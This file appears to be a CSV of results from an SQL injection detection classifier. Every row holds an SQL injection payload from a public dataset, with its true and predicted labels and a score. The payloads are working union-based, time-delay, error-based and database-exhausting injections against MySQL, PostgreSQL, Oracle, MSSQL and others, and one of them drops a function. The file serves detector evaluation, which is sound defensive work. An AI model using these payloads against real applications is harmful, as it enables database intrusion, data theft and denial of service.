text,source,true_label,pred_label,score_sqli,correct
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'kyos' like 'kyos",sajid576/sql-injection-dataset,1,1,1.4160238701560015,1
1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'nbxw'  =  'nbxw,sajid576/sql-injection-dataset,1,1,2.258087510484102,1
"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",sajid576/sql-injection-dataset,1,1,2.1207077037821302,1
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,1.668308281820729,1
"1'||  (  select 'tmsj' where 2971  =  2971 union all select null,null,null,null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,1.5624686539234132,1
"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",sajid576/sql-injection-dataset,1,1,1.6445274988745497,1
"1%"" and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sajid576/sql-injection-dataset,1,1,1.4364046407644668,1
"1  )   where 2473  =  2473 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",sajid576/sql-injection-dataset,1,1,1.7519815774001222,1
1'  )   where 5307  =  5307,sajid576/sql-injection-dataset,1,1,1.3352250976060431,1
1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ),sajid576/sql-injection-dataset,1,1,1.6001635000017247,1
"-7485%'   )    )     )   union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",sajid576/sql-injection-dataset,1,1,1.0557944396461756,1
"1"" where 1852  =  1852 union all select null,null,null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,1.4511887624451107,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex'  =  'kiex",sajid576/sql-injection-dataset,1,1,1.0979798916822143,1
"1   )    )    as xutu where 5811  =  5811 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,1,1,1.8781312501820056,1
"1   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sajid576/sql-injection-dataset,1,1,1.9203481432917662,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%'  =  '",sajid576/sql-injection-dataset,1,1,1.194422751800778,1
"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd",sajid576/sql-injection-dataset,1,1,1.7152336882192705,1
"1"" where 7599  =  7599",sajid576/sql-injection-dataset,1,1,1.1195345648958712,1
1'||  (  select 'yzdz' where 5021  =  5021,sajid576/sql-injection-dataset,1,1,1.736429066477748,1
1  )   as pyjx where 9005  =  9005,sajid576/sql-injection-dataset,1,1,1.0996045474228175,1
"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""uvvy"" like ""uvvy",sajid576/sql-injection-dataset,1,1,1.822621114672427,1
"1'  )   where 1225  =  1225 and elt  (  8831  =  7779,7779  )  --",sajid576/sql-injection-dataset,1,1,1.740643294023636,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,1.3931919301343618,1
"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )",sajid576/sql-injection-dataset,1,1,1.2341574253711798,1
"1'+  (  select 'fxhh' where 2571  =  2571 union all select null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,2.0424830393832347,1
1'  )   and sleep  (  5  )  #,sajid576/sql-injection-dataset,1,1,2.1840011576255343,1
"-1174"" union all select 4303,4303,4303,4303#",sajid576/sql-injection-dataset,1,1,1.950287565640879,1
"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxhn' like 'zxhn",sajid576/sql-injection-dataset,1,1,3.113597050124913,1
1%'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,1,1,2.3781364996160184,1
"1""   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,1,1,1.7383168307589805,1
1'||  (  select 'brde' where 7390  =  7390 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',sajid576/sql-injection-dataset,1,1,2.1041623960173323,1
"select sleep  (  5  )   and ""oivc"" like ""oivc",sajid576/sql-injection-dataset,1,1,1.2276820918431381,1
"1   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4277  =  4277",sajid576/sql-injection-dataset,1,1,2.681401556504654,1
"1%' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and '%'  =  '",sajid576/sql-injection-dataset,1,1,2.9242945287782613,1
"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",sajid576/sql-injection-dataset,1,1,0.9158655723365209,1
"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""ppml""  =  ""ppml",sajid576/sql-injection-dataset,1,1,2.2820329627352947,1
"1 where 7412  =  7412 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,1.9909220077653416,1
"1""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""ponv""  =  ""ponv",sajid576/sql-injection-dataset,1,1,2.845808946389505,1
1' where 6359  =  6359 and   (  3020  =  3020  )  *6703--,sajid576/sql-injection-dataset,1,1,1.5082429574913414,1
-2733'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'btjx'  =  'btjx,sajid576/sql-injection-dataset,1,1,1.8987973941804994,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",sajid576/sql-injection-dataset,1,1,1.6284223531505986,1
"1 union all select null,null,null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,0.9981827680260452,1
"1'+  (  select lang where 4191  =  4191 union all select null,null#",sajid576/sql-injection-dataset,1,1,2.8577268586908113,1
"1  )   where 2020  =  2020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",sajid576/sql-injection-dataset,1,1,1.734550551750051,1
"1%'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",sajid576/sql-injection-dataset,1,1,2.0995925536840425,1
"1'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'esma' like 'esma",sajid576/sql-injection-dataset,1,1,1.9380433603415836,1
"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""umst""  =  ""umst",sajid576/sql-injection-dataset,1,1,1.8314738918220521,1
"1' in boolean mode  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,2.0177310860169992,1
"1%""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,2.668819730796461,1
1  )   where 5944  =  5944 and   (  4446  =  8843  )  *8843--,sajid576/sql-injection-dataset,1,1,1.3987510410010668,1
"1 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )",sajid576/sql-injection-dataset,1,1,1.474775232408637,1
select   (  case when   (  2768  =  8868  )   then 2768 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sajid576/sql-injection-dataset,1,1,0.9629018824712675,1
"-1150'  )   as hdby where 4032  =  4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",sajid576/sql-injection-dataset,1,1,0.7094911971018188,1
1'  )   waitfor delay '0:0:5',sajid576/sql-injection-dataset,1,1,1.3240362287788274,1
"1%'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  '",sajid576/sql-injection-dataset,1,1,1.8526757958904057,1
1'+  (  select 'ggkm' where 3394  =  3394,sajid576/sql-injection-dataset,1,1,1.5052030888638397,1
"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""hvwv""  =  ""hvwv",sajid576/sql-injection-dataset,1,1,1.6558463769348308,1
"1' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,1,1,1.5157755037713647,1
1'  )   as xrap where 5523  =  5523 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,sajid576/sql-injection-dataset,1,1,2.1383475716028117,1
"-4205'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )",sajid576/sql-injection-dataset,1,1,1.1955206188312935,1
"1'   )    )    and make_set  (  1002  =  3556,3556  )   and    (    (   'mfao'  =  'mfao",sajid576/sql-injection-dataset,1,1,2.1544109429198635,1
"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )",sajid576/sql-injection-dataset,1,1,1.5938002354521492,1
"-1166'   )    )    as icdz where 1042  =  1042 union all select 1042,1042,1042,1042,1042#",sajid576/sql-injection-dataset,1,1,1.6685501200350128,1
-1602' or 3038  =  3038,sajid576/sql-injection-dataset,1,1,0.9668231674988087,1
1'||  (  select 'pyga' from dual where 8501  =  8501 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,sajid576/sql-injection-dataset,1,1,2.4488015653859483,1
select sleep  (  5  )  --,sajid576/sql-injection-dataset,1,1,1.2597139712938623,1
"1"" and sleep  (  5  )",sajid576/sql-injection-dataset,1,1,1.607105841932277,1
1  )   as wshv where 5684  =  5684,sajid576/sql-injection-dataset,1,1,1.1312209682738654,1
end and    (    (   'zlsq'  =  'zlsq,sajid576/sql-injection-dataset,1,1,1.4258025165545116,1
"1%'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",sajid576/sql-injection-dataset,1,1,2.096582970593003,1
1'||  (  select 'ywjy' where 7579  =  7579,sajid576/sql-injection-dataset,1,1,1.6743584085845904,1
"1  )   as zqxa where 5718  =  5718 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sajid576/sql-injection-dataset,1,1,2.0529047925999846,1
"-5800""  )   or 6872  =  6872 and   (  ""tcab"" like ""tcab",sajid576/sql-injection-dataset,1,1,1.2370150553662125,1
"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",sajid576/sql-injection-dataset,1,1,2.3473218727730703,1
"1%""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,1,1,1.9133668806938777,1
"-5207  )   where 6987  =  6987 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",sajid576/sql-injection-dataset,1,1,1.453123771076311,1
"-5294%""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,1.7202902181164306,1
"-9829'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,1,1,2.317042200683439,1
"1""  )   as rbgl where 3822  =  3822 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",sajid576/sql-injection-dataset,1,1,1.7775438779595176,1
"1'  )   as jwvp where 5231  =  5231 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sajid576/sql-injection-dataset,1,1,2.1046009517649917,1
1' and 7533  =  7533 and 'clqy' like 'clqy,sajid576/sql-injection-dataset,1,1,1.0022795005945575,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""ejmj"" like ""ejmj",sajid576/sql-injection-dataset,1,1,1.306871945613139,1
"1%'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  '%'  =  '",sajid576/sql-injection-dataset,1,1,2.415746317328347,1
"1""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""gcnq"" like ""gcnq",sajid576/sql-injection-dataset,1,1,1.770854482054435,1
1'||  (  select 'zwcp' where 3333  =  3333,sajid576/sql-injection-dataset,1,1,1.5161868768794755,1
"-1303' union all select 4840,4840#",sajid576/sql-injection-dataset,1,1,3.0043482655566205,1
1'+  (  select 'zgtu' where 8419  =  8419,sajid576/sql-injection-dataset,1,1,1.6306073236560357,1
"-9504%""   )    )    or 8098  =  7472",sajid576/sql-injection-dataset,1,1,1.442503140541771,1
1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,1,1,1.959040865413853,1
"1"" and make_set  (  4214  =  9503,9503  )   and ""phjg"" like ""phjg",sajid576/sql-injection-dataset,1,1,1.3624920386824098,1
"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )",sajid576/sql-injection-dataset,1,1,0.9694209265163712,1
"1'  )   where 6214  =  6214 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",sajid576/sql-injection-dataset,1,1,1.7587113773630292,1
"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm",sajid576/sql-injection-dataset,1,1,2.331948331027162,1
"-7916'   )    )    union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",sajid576/sql-injection-dataset,1,1,0.517482259683569,1
"-7551 or elt  (  6900  =  7195,7195  )",sajid576/sql-injection-dataset,1,1,0.6913735303423437,1
if  (  3245  =  6168  )   select 3245 else drop function nafj--,sajid576/sql-injection-dataset,1,1,0.9448601664741084,1
"1,  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )",sajid576/sql-injection-dataset,1,1,2.163043395974037,1
"1%""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,1.7208394283416086,1
"1%'  )   union all select null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,1.6449210319728667,1
1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ),sajid576/sql-injection-dataset,1,1,1.3265091868135057,1
-1257'  )   order by 1#,sajid576/sql-injection-dataset,1,1,1.0012874173149884,1
"-4739'   )    )    union all select 6585,6585,6585,6585,6585--",sajid576/sql-injection-dataset,1,1,1.95461136278782,1
"-3472' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )",sajid576/sql-injection-dataset,1,1,1.1557319352103463,1
"1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",sajid576/sql-injection-dataset,1,1,1.994621323413309,1
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ),sajid576/sql-injection-dataset,1,1,2.1397396279656866,1
"1%""   )    )     )   and make_set  (  8191  =  7813,7813  )   and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,2.1495849570762613,1
"1%""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sajid576/sql-injection-dataset,1,1,1.3339868088900877,1
"1' where 6963  =  6963 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",sajid576/sql-injection-dataset,1,1,1.9932075354126888,1
"1  )   as kqas where 7302  =  7302 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sajid576/sql-injection-dataset,1,1,2.3247319131946944,1
"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'pbqg'  =  'pbqg",sajid576/sql-injection-dataset,1,1,1.7227815709964478,1
1%'   )    )    or sleep  (  5  )   and    (    (   '%'  =  ',sajid576/sql-injection-dataset,1,1,3.213291398247006,1
"1""  )   as ronb where 9368  =  9368",sajid576/sql-injection-dataset,1,1,1.1269416296183032,1
select   (  case when   (  5142  =  6855  )   then 5142 else 5142*  (  select 5142 from mysql.db  )   end  )  #,sajid576/sql-injection-dataset,1,1,1.2968217553710164,1
1   )    )    as xoch where 8765  =  8765 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sajid576/sql-injection-dataset,1,1,1.8556251149808904,1
"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'qtfl'  =  'qtfl",sajid576/sql-injection-dataset,1,1,1.381490706707302,1
-4873'   )    )     )   or 3038  =  3038,sajid576/sql-injection-dataset,1,1,1.980892287566208,1
select   (  case when   (  2132  =  8969  )   then 1 else 2132*  (  select 2132 from master..sysdatabases  )   end  )  --,sajid576/sql-injection-dataset,1,1,1.1735936578424324,1
"1%'   )    )    union all select null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,2.076633518843679,1
"1""  )   where 2016  =  2016 and   (  1547  =  2093  )  *2093--",sajid576/sql-injection-dataset,1,1,1.41195973346161,1
-5313'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'wkkp' like 'wkkp,sajid576/sql-injection-dataset,1,1,2.304355559122896,1
"-7482""   )    )     )   or 9077  =  2651",sajid576/sql-injection-dataset,1,1,1.7494159354941288,1
"1'||  (  select 'nbmo' from dual where 5572  =  5572 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sajid576/sql-injection-dataset,1,1,2.4051513382022303,1
"1%""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,2.0747630468565106,1
1%' and 2006  =  2006,sajid576/sql-injection-dataset,1,1,0.9509109821292528,1
-9673  )   or 8571  =  8571--,sajid576/sql-injection-dataset,1,1,1.1158726692255847,1
1  )   where 1100  =  1100 and sleep  (  5  )  --,sajid576/sql-injection-dataset,1,1,1.9782566866854818,1
"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'nqam'  =  'nqam",sajid576/sql-injection-dataset,1,1,2.424161399199241,1
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'iwmy'  =  'iwmy,sajid576/sql-injection-dataset,1,1,2.1966525523682376,1
"1""   )    )    as eagr where 3366  =  3366 and elt  (  4249  =  4249,7259  )  --",sajid576/sql-injection-dataset,1,1,1.9140758041645696,1
"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",sajid576/sql-injection-dataset,1,1,2.241755290720631,1
"-6475""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""mdsx"" like ""mdsx",sajid576/sql-injection-dataset,1,1,1.886675406546166,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'nbsf' like 'nbsf",sajid576/sql-injection-dataset,1,1,1.5659855452517846,1
1 rlike sleep  (  5  )  # urxh,sajid576/sql-injection-dataset,1,1,0.9387432129929821,1
"1%'   )    )    union all select null,null,null--",sajid576/sql-injection-dataset,1,1,4.453121577239234,1
"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",sajid576/sql-injection-dataset,1,1,2.1929228861148458,1
1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',sajid576/sql-injection-dataset,1,1,2.929389783596072,1
"1',  (  select   (  case when   (  4209  =  5879  )   then 1 else 4209*  (  select 4209 from information_schema.character_sets  )   end   )    )",sajid576/sql-injection-dataset,1,1,1.8345428753784727,1
"-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq",sajid576/sql-injection-dataset,1,1,1.8582329148053103,1
-8836%'  )   or 4856  =  3891,sajid576/sql-injection-dataset,1,1,1.074643489272721,1
